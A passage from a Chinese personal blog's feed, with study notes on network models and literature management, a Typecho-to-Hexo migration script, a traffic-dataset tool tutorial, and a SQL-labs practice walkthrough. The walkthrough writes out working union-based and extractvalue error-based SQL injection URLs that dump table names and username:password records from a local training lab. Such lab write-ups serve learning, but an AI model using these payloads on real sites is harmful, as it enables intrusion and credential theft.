P、SMTP、DNS、RTP、Telnet&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[306,307]},&quot;v&quot;:&quot;传输层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[308,309]},&quot;v&quot;:&quot;对应OSI的传输层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[310,311]},&quot;v&quot;:&quot;典型协议：TCP、UDP&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[312,313]},&quot;v&quot;:&quot;网际层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[314,315]},&quot;v&quot;:&quot;对应OSI的网络层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[316,317]},&quot;v&quot;:&quot;将分组发往任何网络，并为之独立地选择合适的路由，不保证分组有序到达，有序交付由高层负责&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[318,319]},&quot;v&quot;:&quot;定义了IP协议，eg：IPV4、IPV6&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[320,321]},&quot;v&quot;:&quot;网络接口层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[322,323]},&quot;v&quot;:&quot;对应OSI的数据链路层和物理层，表示与物理网络的接口&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[324,325]},&quot;v&quot;:&quot;指出主机必须使用某种协议与网络连接&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[326,327]},&quot;v&quot;:&quot;从主机或者结点接收IP分组，并把他们发送到指定的物理网络上&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[328,329]},&quot;v&quot;:&quot;TCP/IP模型与OSI模型对比&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[330,331]},&quot;v&quot;:&quot;相同&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[332,333]},&quot;v&quot;:&quot;都采取分层的体系结构，分层的功能大体相似&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[334,335]},&quot;v&quot;:&quot;基于独立的协议栈概念&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[336,337]},&quot;v&quot;:&quot;都可以解决异构网络的互联问题，实现不同厂家的计算机之间的通信&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[338,339]},&quot;v&quot;:&quot;不同&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[340,341]},&quot;v&quot;:&quot;OSI精确定义了服务、协议、接口这三个主要概念（最大贡献），TCP/IP没有明确区分&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[342,343]},&quot;v&quot;:&quot;OSI通用性良好，TCP/IP实际上是对已有协议的描述，不适用于其他非TCP/IP的协议栈&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[344,345]},&quot;v&quot;:&quot;TCP/IP考虑了多种异构网的互联问题，并把网际协议IP作为单独的层次，OSI则是后续在网络层中划分子层实现类似TCP/IP中IP的功能&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[346,347]},&quot;v&quot;:&quot;网络层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[348,349]},&quot;v&quot;:&quot;OSI支持无连接和面向连接&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[350,351]},&quot;v&quot;:&quot;TCP/IP只有无连接&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[352,353]},&quot;v&quot;:&quot;传输层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[354,355]},&quot;v&quot;:&quot;OSI支持面向连接&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[356,357]},&quot;v&quot;:&quot;TCP/IP支持面向连接和无连接&quot;}]}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[358,359]},&quot;v&quot;:&quot;五层参考模型&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[360,361]},&quot;v&quot;:&quot;应用层、传输层、网络层、数据链路层、物理层&quot;}]}]}]}"></svg></div>]]></content>
      
      
      <categories>
          
          <category> knowledge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《文献管理与信息分析》-MindMap</title>
      <link href="/academic/11.html"/>
      <url>/academic/11.html</url>
      
        <content type="html"><![CDATA[<p>经同学推荐，潦草地学习了中科大罗昭峰老师的<a href="https://www.icourse163.org/course/USTC-9002?from=searchPage&outVendor=zw_mooc_pcssjg_">《文献管理与信息分析》</a>课程。</p><p>并据此，绘制了相关的思维导图;O) 方便日后的回顾</p><h2 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h2><blockquote><p>这是一门提升个人学习能力 , 提升效率，节省时间的课程。<br>“助力科研,推动创新”是开设这门课程十多年来不变的初衷，但课程内容一直在改进。<br>课程内容包括三大模块，分别致力于：提升学习效率，提升科研效率，提升创新思维能力。<br>累计学员超过30多万，超过80所高校认可本课程的学分。2015年入选全国工程专业学位首批在线课程，2017年入选国家精品在线课程，2019年入选华东5校联盟推荐课程。</p></blockquote><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><ul><li><p><a href="https://www.processon.com/view/link/61b0b4370e3e74708a914e96">提升学习效率</a></p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/academic/learn.png" alt="learn"></p></li><li><p><a href="https://www.processon.com/view/link/63f32293d2aa8b66bc1ff358">提升科研效率</a></p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/academic/research.png" alt="research"></p></li><li><p><a href="https://www.processon.com/view/link/63f32293d2aa8b66bc1ff358">提升创新思维</a></p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/academic/innovation.png" alt="innovation"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mindmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何将数据从typecho迁移至hexo?</title>
      <link href="/technique/10.html"/>
      <url>/technique/10.html</url>
      
        <content type="html"><![CDATA[<h2 id="备份typecho数据"><a href="#备份typecho数据" class="headerlink" title="备份typecho数据"></a>备份typecho数据</h2><p>将使用typecho搭建的网站数据库进行备份</p><h2 id="将备份的数据库文件在本地导入"><a href="#将备份的数据库文件在本地导入" class="headerlink" title="将备份的数据库文件在本地导入"></a>将备份的数据库文件在本地导入</h2><p>本地安装mysql以及数据库管理工具Navicat。使用Navicat新建本地连接，并新建typecho数据库，在typecho数据库中运行备份的sql文件，运行完成后即成功将相关的表和数据导入。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/tech/typecho_database.png" alt="typecho database"></p><h2 id="编写typecho数据转成Markdown的脚本"><a href="#编写typecho数据转成Markdown的脚本" class="headerlink" title="编写typecho数据转成Markdown的脚本"></a>编写typecho数据转成Markdown的脚本</h2><p>借鉴<a href="https://www.tinymind.net.cn/articles/f902089fb99b43">tanmx</a>的博客，使用pymysql模块，稍微修改后代码如下：</p><pre><code># -*- coding: utf-8 -*-import codecsimport os#import torndbimport pymysqlimport arrowdef create_data(cursor):    # 创建分类和标签    sql  = &quot;select type, slug, name from typecho_metas&quot;    cursor.execute(sql)    categories = cursor.fetchall()    print(categories)    for cate in categories:        path = &#39;data/%s&#39; % cate[1]        if not os.path.exists(path):            os.makedirs(path)        f = codecs.open(&#39;%s/index.md&#39; % path, &#39;w&#39;, &quot;utf-8&quot;)        f.write(&quot;---&quot;)        f.write(&quot;\n title: %s &quot; % cate[1])        f.write(&quot;\n date: %s&quot; % arrow.now().format(&#39;YYYY-MM-DD HH:mm:ss&#39;))        # 区分分类和标签        if cate[0] == &#39;category&#39;:            f.write(&#39;\n type: &quot;categories&quot;&#39;)        elif cate[0] == &#39;tags&#39;:            f.write(&#39;\n type: &quot;tags&quot;&#39;)        # 禁止评论        f.write(&quot;\n comments: true&quot;)        f.write(&quot;\n--- \n &quot;)        f.close()    # 创建文章    sql1 = &quot;select cid, title, slug, text, created from typecho_contents where type=&#39;post&#39;&quot;    cursor.execute(sql1)    entries = cursor.fetchall()    for e in entries:        title = e[1]        urlname = e[2]        print(title)        content = str(e[3]).replace(&#39;&lt;!--markdown--&gt;&#39;, &#39;&#39;)        tags = []        category = &quot;&quot;        # 找出文章的tag及category        sql2 = &quot;select type, name, slug from `typecho_relationships` ts, typecho_metas tm where tm.mid = ts.mid and ts.cid = &#123;&#125;&quot;.format(e[0])        cursor.execute(sql2)        metas = cursor.fetchall()        for m in metas:            if m[0] == &#39;tag&#39;:                tags.append(m[1])            if m[0] == &#39;category&#39;:                category = m[2]        path = &#39;data/_posts/&#39;        if not os.path.exists(path):            os.makedirs(path)        f = codecs.open(r&quot;%s%s.md&quot; % (path,title), &#39;w&#39;, &quot;utf-8&quot;)        f.write(&quot;---&quot;)        f.write(&quot;\n title: %s&quot; % title)        f.write(&quot;\n date: %s&quot; % arrow.get(e[4]).format(&#39;YYYY-MM-DD HH:mm:ss&#39;))        f.write(&quot;\n categories: %s&quot; % category)        f.write(&quot;\n tags: [%s]&quot; % &#39;,&#39;.join(tags))        f.write(&quot;\n urlname: %s&quot; % urlname)        f.write(&quot;\n--- \n&quot;)        f.write(content)        f.close()def main():    # 数据库连接信息    db = pymysql.Connection(host=&quot;127.0.0.1&quot;, database=&quot;typecho&quot;, user=&quot;你设置的用户名&quot;, password=&quot;用户名对应的密码&quot;)    #modified    cursor = db.cursor()    create_data(cursor)if __name__ == &quot;__main__&quot;:    main()</code></pre><h2 id="将生成的文件放入hexo博客目录"><a href="#将生成的文件放入hexo博客目录" class="headerlink" title="将生成的文件放入hexo博客目录"></a>将生成的文件放入hexo博客目录</h2><p>将data_posts中的.md文件放入source_posts目录下，<br>将data\下的其余文件夹（分类，即原来的typecho_metas数据）放入source\目录下</p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文献阅读技巧</title>
      <link href="/academic/9.html"/>
      <url>/academic/9.html</url>
      
        <content type="html"><![CDATA[<h2 id="文献搜集方法"><a href="#文献搜集方法" class="headerlink" title="文献搜集方法"></a>文献搜集方法</h2><p>（1）平台：<br>国内：<a href="https://www.cnki.net/">中国知网</a>、<a href="http://www.cqvip.com/">维普</a>、<a href="https://www.wanfangdata.com.cn/index.html">万方</a><br>国外：<a href="https://scholar.google.com/">谷歌学术</a>、<a href="https://ieeexplore.ieee.org/Xplore/home.jsp">IEEE</a>、<a href="https://dl.acm.org/">ACM</a>、<a href="https://dblp.uni-trier.de/">dblp</a>、<a href="https://link.springer.com/">Springer</a>、<a href="https://singlelogin.org/">Z-library</a><br>网络安全领域四大顶会：Network and Distributed System Security Symposium(<a href="https://www.ndss-symposium.org/">NDSS</a>)、ACM Conference on Computer and Communications Security(<a href="https://www.sigsac.org/ccs.html">CCS</a>)、IEEE Symposium on Security &amp; Privacy(<a href="http://www.ieee-security.org/TC/SP-Index.html">S&amp;P</a>)、USENIX Security Symposium(<a href="https://www.usenix.org/conferences">USENIX</a>)</p><p>（2）辅助网站：<br><a href="https://sci-hub.shop/">Sci-hub</a>：根据URL、PMID或者doi号搜索对应文献，支持免费下载<br>谷歌学术镜像站：<a href="https://ac.scmor.com/">思谋</a>、<a href="http://scholar.hedasudi.com/">Google镜像</a></p><h2 id="文献管理工具"><a href="#文献管理工具" class="headerlink" title="文献管理工具"></a>文献管理工具</h2><p>国内：<br>①<a href="http://www.inoteexpress.com/">NoteExpress</a> ：符合中国人使用习惯，中文支持良好，与Word适配性比较好<br>国外：<br>①<a href="https://www.endnote.com/">EndNote</a>：界面简单，搜索查询方便，与Word无缝链接<br>②<a href="https://www.mendeley.com/?interaction_required=true">Mendeley</a>：适合用于阅读文献；chrome上有扩展可以直接采集网页论文（比如arxiv），不需要自己下载再导入；文献推送功能不错、pdf适配性好、高亮复制标注搜索等功能易操作<br>③<a href="https://www.zotero.org/">Zotero</a>：有group library，支持共享<br>④<a href="https://www.papersapp.com/">Papers</a></p><h2 id="文献阅读"><a href="#文献阅读" class="headerlink" title="文献阅读"></a>文献阅读</h2><p>以下为学习过程中的技巧总结以及他人的经验分享</p><p>（1）中文论文论文阅读</p><p>因为我们的母语为中文，先阅读中文论文，可以对待研究领域的基本概念、基础知识和常见技术等有一个快速的了解。优先选择的类型为硕博论文和综述类论文，并选择近几年发表的论文。其中，硕博论文包含其研究内容的系统介绍，可以帮助我们了解对应领域的常见研究方法，综述类篇幅小于硕博论文，也是对某一研究领域的系统介绍，可以选择计算机学报、中文信息学报、软件学报、电子学报等较高水平学报期刊发表的综述。</p><p>（2）英文论文阅读</p><p>一般最新和最好的研究成果都发布在高水平的期刊和会议上，因此需要首先进行筛选，一种方法是选择发表在研究领域的顶级会议和顶级期刊上的论文，另一种方式是借助其他工具判断论文的水平。这里推荐的两个工具，一是<a href="https://www.letpub.com.cn/index.php?page=journalapp&view=search">Let-Pub，SCI查询与投稿分析系统</a>，通过该网站可以判断论文是否被SCI、EI、中文核心期刊收录，二是提供论文等级显示的浏览器扩展，例如名字为<a href="https://github.com/WenyanLiu/CCFrank4dblp">CCFrank</a>的Chrome浏览器扩展（PS：作者一直在更新，大家有什么需求快去issue），该扩展适用于dblp、谷歌学术、Connected Papers 和 Web of Science ，在搜索结果页显示CCF等级（中国计算机学会推荐国际学术会议和期刊目录的分级）。<img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/papers/ccfrank_result.png" alt="搜索结果显示"><br>另一个<a href="https://chrome.google.com/webstore/detail/show-conferencejournal-ra/hcfmpekcjhpfcokagmhnhldpacknikim?utm_source=chrome-ntp-icon">显示会议&#x2F;期刊等级</a>除dblp和谷歌学术，还支持IEEE xplore、ACM和Springer。<br>如果需要综述类论文，搜索关键词为survey、overview。</p>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>USTC-TK2016工具使用教程</title>
      <link href="/technique/8.html"/>
      <url>/technique/8.html</url>
      
        <content type="html"><![CDATA[<p>工具下载地址：<a href="https://github.com/yungshenglu/USTC-TK2016">USTC-TK2016</a>  ps：使用git较zip下载更好</p><p>该工具的github README中有基本的安装和使用步骤，针对不同的运行环境会有一些小问题，以下是本人参考<a href="https://blog.csdn.net/u010916338/article/details/86511009">博文</a>后重新整理的安装使用教程</p><p><strong>环境</strong></p><p>Windows 10操作系统<br>python 3.7<br>powershell 5.1<br>splitcap </p><h2 id="Git安装"><a href="#Git安装" class="headerlink" title="Git安装"></a>Git安装</h2><p>①windows安装git：<a href="https://git-scm.com/download/win">下载地址</a>，根据网上的安装教程进行安装，安装步骤中大部分设置为默认<br>②打开Git Bash，进入自己的工作目录，然后输入以下对应的git clone命令</p><pre><code># Clone the repository on &quot;master&quot; branch$ git clone -b master https://github.com/yungshenglu/USTC-TK2016</code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>(1) 将pcap数据集放入1_Pcap文件夹</p><p>(2)执行1_Pcap2Session.ps1文件：</p><p>①ps1文件需要在powershell中运行，Windows 10系统自带powershell。在任务栏中搜索powershell并点击右键使用管理员权限运行；</p><p>②在powershell中输入<code>set-executionpolicy remotesigned</code>，更改执行策略;<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/traffic_tool/powershell_config.png" alt="powershell_config"></p><p>③如果将pcap文件按照session切割，将1_Pcap2Session.ps1文件的第10和第14行取消注释，第11行和第15行注释掉；如果将pcap文件按照flow切割，与前面恰好相反；<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/traffic_tool/1_code.png" alt="code"></p><p>④在powershell中进入USTC-TK2016目录，输入<code>.\1_Pcap2Session.ps1</code>尝试运行ps1文件，出现：<code>处理的异常: System.TypeInitializationException: &quot;SplitCap.Program&quot;的类型初始值设定项引发异常。</code>和<code>USTC-TK2016\2_Session\AllLayers\…找不到指定文件</code>的错误。前者是由于Splitcap版本过低导致的，在splitcap下载地址：<a href="https://www.netresec.com/?page=SplitCap">link</a>中下载最新版本的splitcap，将exe文件放入原来的0_Tool\SplitCap_2-1文件夹下，删除原来的SplitCap.exe文件，或者在ps1文件中修改代码；后者按照源代码中的输出文件格式<code>2_Session\AllLayers\$($f.BaseName)-ALL</code>和<code>2_Session\AllLayers\$($f.BaseName)-L7</code>（变量是pcap文件除去文件后缀的文件名），手动在指定目录下创建对应的文件夹</p><p>⑤再次运行，执行成功后在<code>2_Session\AllLayers\</code>和<code>2_Session\L7\</code>目录下会有对应的pcap文件</p><p>(3) 执行2_ProcessSession.ps1文件：</p><p>①打开ps1文件，将需要处理的源文件目录变量修改为：<code>$SOURCE_SESSION_DIR = &quot;2_Session\L7&quot;</code>或者<code>$SOURCE_SESSION_DIR = &quot;2_Session\AllLayers&quot;</code>，即上一步数据切割后保存的文件目录<br>②根据ps1文件中的以下代码手动创建对应的文件夹</p><pre><code>$paths = @((&#39;3_ProcessedSession\FilteredSession\Train&#39;, &#39;3_ProcessedSession\TrimedSession\Train&#39;), (&#39;3_ProcessedSession\FilteredSession\Test&#39;, &#39;3_ProcessedSession\TrimedSession\Test&#39;))</code></pre><p>③输入<code>.\2_ProcessSession.ps1</code>尝试运行ps1文件，执行成功后</p><pre><code>FilteredSession\ - Get the top 60000 large PCAP filesTrimedSession\ - Trim the filtered PCAP files into size 784 bytes (28 x 28) and append 0x00 if the PCAP file is shorter than 784 bytesThe files in subdirectory Test\ and Train\ is random picked from dataset.</code></pre><p>(4) 执行3_Session2Png.py文件：</p><p>①命令行输入<code>python 3_Session2Png.py</code>运行，生成的图片保存在4_Png目录下；</p><p>②运行时报错：<code>TypeError: slice indices must be integers or None or have an __index__ method</code>，根据报错提示查看对应的代码<code>fh = numpy.reshape(fh[:rn*width],(-1,width)) </code>，因为[]中的数据变成了浮点数，不能作为数组的下标，需要将其强制转换为int型，修改为<code>fh = numpy.reshape(fh[:int(rn*width)],(-1,width)) </code>，或者因为rn的值源于前面的<code>rn = len(fh)/width</code>，这里除法保留了小数部分，所以需要将单斜杠变为双斜杠只保留整数部分</p><p>(5) 执行4_Png2Mnist.py文件：</p><p>①原文件的注释中要求python&gt;2.5，代码中的print函数使用表明为python2环境，需要修改print语句为python3版本</p><p>②如果需要添加print语句测试某些变量，在增加代码时会遇到缩进的问题，因为Git的代码通常会出现4个空格和tab键不匹配问题，可以参考<a href="https://blog.csdn.net/hhy_csdn/article/details/82263757">link</a>进行修改</p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL-labs过关笔记</title>
      <link href="/technique/7.html"/>
      <url>/technique/7.html</url>
      
        <content type="html"><![CDATA[<p>SQL-labs靶场搭建；<br>①docker搭建：<a href="https://blog.csdn.net/qq_39670065/article/details/106762824?utm_medium=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control">参考链接</a>，博文还提供通关指南<br>②本地搭建：Github<a href="https://github.com/Audi-1/sqli-labs">链接</a>，将下载后的文件夹放入phpstudy中的www目录下，开启phpstudy的Apache和mysql服务，之后就可以通过<code>http://本机ip/sqli-labs</code> 访问靶场进行关卡选择</p><p>过关参考（<strong>部分</strong>）：<br>对于一般的靶场实验要求，主要的步骤为：测试是否存在SQL注入，寻找注入点-&gt;爆库名、表名、列名、记录<br>一些不同的关卡通关方式也比较类似，所以针对相同的一些步骤这里只进行简要说明。<br>1、Less-1<br>(1)根据提示“Please input the ID as parameter with numeric value”可知为GET方法，数据在URL中，所以构造URL：<code>http://127.0.0.1/sqli-labs/Less1/?id=1 || 2</code> 并访问，如下显示 id 对应用户名和密码：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.1.png" alt="Less-1.1"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.2.png" alt="Less-1.2"><br>(2)构造URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=2-1</code> 并访问，显示 id&#x3D;2 的用户信息页面，证明该注入点并非数字型注入<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.3.png" alt="less-1.3"><br>(3)构造URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=2&#39;</code> 并访问，页面返回了SQL语法报错信息，证明单引号已经拼接到后台SQL语句中，起到了闭合作用，并影响了后台SQL查询行为<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.4.png" alt="less-1.4"><br>(4)构造URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; --+</code>访问，前者页面返回了数据库报错信息，后者页面返回正常，又–+在数据库中表示注释，猜测该系统后台SQL查询语句应该类似于如下语句：<br>    SELECT username, password FROME t_user WHERE UserID &#x3D; ‘1’ LIMIT 0,1<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.5.png" alt="less-1.5"><br>(5)通过ORDER BY判断表的列数，因为 ORDER BY num 通过按第num列将元组排序，当num超过列数时返回错误信息，所以可以通过它判断表的列数，提交的URL格式为： <code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; ORDER BY num--+</code>，将 ORDER BY 的数字num从2逐步增大到3页面返回正常，直到增大为4时页面返回报错信息”Unknown column”，表明数据表的列数为3列：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.6.png" alt="less-1.6"><br>(6)找注入点：将 id&#x3D;1 改为一个数据库不存在的 id 值，如-1，因为不存在 id 为-1 的所以前面的查询为空(也可以使用id&#x3D;1 and 1&#x3D;2，只要保证联合查询前者为空)，通过联合查询显示后面的查询结果。因为已得出有三列，使用 union select 1,2,3 联合查询语句查看页面是否有显示位，构造的 URL 如下：<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,3--+</code>，返回页面表明有两个显示位，分别显示了数字 2、3，可通过这两个显示位爆出需要的数据，界面如下：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.7.png" alt="less-1.7"><br>(7)爆库名：构造URL ： <code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; UNION SELECT 1,database(),3--+</code>，在第二个显示位得到数据库名称位security，如图：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.8.png" alt="less-1.8"><br>(8)爆表名：构造URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code>，其中information_schema是所有数据库中都存在的表，通过group_concat把所有的表名从information_schema 中查询出，爆出库中的有 4 张表:emails,referers,uagents,users，猜测其中用户名表名为 users，如下图：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.9.png" alt="less-1.9"><br>(9)爆列名：构造URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code>，爆出列名有 id、username、password，如图：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.10.png" alt="less-1.10"><br>(10)爆记录：对关心的用户名和密码进行爆破，构造如下URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(username,&quot;:&quot;,password) from users--+</code> ，其中”:”整体可以替换为十六进制表示的 0x3a，同样能被MySQL识别，如图：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.11.png" alt="less-1.11"></p><p>2、Less-2<br>经尝试猜测的后台SQL语句如下：</p><pre><code>SELECT * FROM users WHERE id=$id LIMIT 0,1</code></pre><p>所以构造URL时不需要单引号等等这些闭合手段，其余和关卡一类似<br>3、Less-3<br>经尝试猜测的后台SQL语句如下：</p><pre><code>SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code></pre><p>所以构造URL时使用’)闭合，其余步骤类似</p><p>4、Less-4<br>经尝试猜测后台的SQL语句如下：</p><pre><code>SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1</code></pre><p>所以构造URL时使用”)闭合，和关卡3类似</p><p>5、Less-5<br>单引号闭合，和关卡6类似，在关卡6进行详细说明</p><p>6、Less-6<br>(1)首先按照提示在url中输入<code>?id=1</code>观察发现无login name和password回显<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.1.png" alt="less-6.1"><br>(2)构造 <code>URL：http://127.0.0.1/sqli-labs/Less-6/?id=1&#39;</code>并访问，页面正常说明单引号没有拼接到后台 SQL 语句，再使用双引号闭合页面提示SQL语句语法错误，说明双引号被拼接到后台<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.2.png" alt="less-6.2"><br>(3)构造 URL：<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; ORDER BY 2--+</code>，数字增大为 4 时页面返回报错信息，表明数据表的列数为3列<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.3.png" alt="less-6.3"></p><p><strong>爆破：</strong>由于没有回显位，所以使用extractvalue(xml_frag,xpath_expr)函数，其中字符串参数：XML标记片段 xml_frag和XPath表达式 xpath_expr（也称为定位器）; 它返回CDATA第一个文本节点的text()，该节点是XPath表达式匹配的元素的子元素。当xpath格式错误时，函数的报错信息显示XPATH syntax error:第二个参数的信息&#x2F;执行结果。所以可以利用这个函数的特性，将想要获得的数据库内容放在第二个参数的位置，通过报错信息显示出来。（updatexml函数也有类似效果）<br>(4)爆库名：构造 URL：<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;and extractvalue(1,concat(0x23,database(),0x23))--+</code>，concat函数可用可不用，将#和想要获取数据库的数据库内容用concat连接起来只是为了突出显示，也可以单独extractvalue(1,database())<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.4.png" alt="less-6.4"><br>(5)爆表名：构造URL: <code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit num,1),0x23))--+</code>，其中num的数值从0开始逐一递增将所有表名回显。limit函数用于强制sql语句返回指定记录数，接受一个或两个整型参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，由于回显位限制，每次只能一行，因此通过改变第一个参数将表名遍历。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.5.png" alt="less-6.5"><br>(6)爆列名：构造URL：<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit num,1),0x23))--+</code>，num从0开始逐一递增，users表的列名有id, usrname, password<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.6.png" alt="less-6.6"><br>(7)爆记录：构造URL：<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;and extractvalue(1,concat(0x23,(select username from users limit 1,1),0x23))--+</code>，用户名回显后将username改为paswword<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.7.png" alt="less-6.7"><br><img 